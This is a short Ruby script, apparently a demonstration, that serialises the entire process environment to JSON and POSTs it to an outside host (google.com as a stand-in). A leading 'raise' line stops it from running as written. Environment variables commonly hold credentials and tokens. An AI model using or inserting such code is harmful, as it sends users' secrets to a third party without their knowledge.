raise "Don't run this"
require 'net/http'
require 'uri'
require 'json'

uri = URI.parse("https://google.com/")
request = Net::HTTP::Post.new(uri)
request.body = JSON.dump(
  ENV.to_hash)

req_options = {
  use_ssl: uri.scheme == "https",
}

response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
  http.request(request)
end

# response.code
response.body